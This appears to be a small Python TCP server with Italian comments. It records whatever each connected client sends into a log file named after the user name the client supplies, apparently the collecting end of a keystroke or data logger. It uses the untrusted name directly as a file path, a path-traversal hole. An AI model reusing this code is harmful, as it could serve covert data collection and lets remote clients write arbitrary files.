import socket
import os
import threading

#gloabl vars
server_socket = socket.socket()
client_list = list()
is_server_open = False

"""def commands():
    while True:
        i = input()
        if i == 'q':
            server_socket.close()
            is_server_open = False
            #chiudere tutte le connessioni
"""


def main():
    print("[DIO] Per chi usa questo programma non c'è ne inferno ne paradiso")

    #commands_thread = threading.Thread(target=commands)
    #commands_thread.start()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_address = ('192.168.178.53', 12345)
    server_socket.bind(server_address)
    
    server_socket.listen(25)

    is_server_open = True
    print("[SERVER] Il server è in ascolto su {}:{}".format(*server_address))

    while is_server_open:
        print("[SERVER] In attesa di una connessione...")
        client_socket, client_address = server_socket.accept()
        print("[SERVER] Connessione accettata da:", client_address)
        client_list.append((client_socket, client_address))

        data = client_socket.recv(1024) 
        user = data.decode()
        print("Si è connesso: ", user)

        while True:
            #da sistemare facendo che non vada a capo
            data = client_socket.recv(1024)
            decoded_data = str(data.decode('utf-8'))
            newLog = open(user, "a")
            newLog.write(decoded_data)
            newLog.close()

#########################
if __name__== "__main__":
   main()                
#########################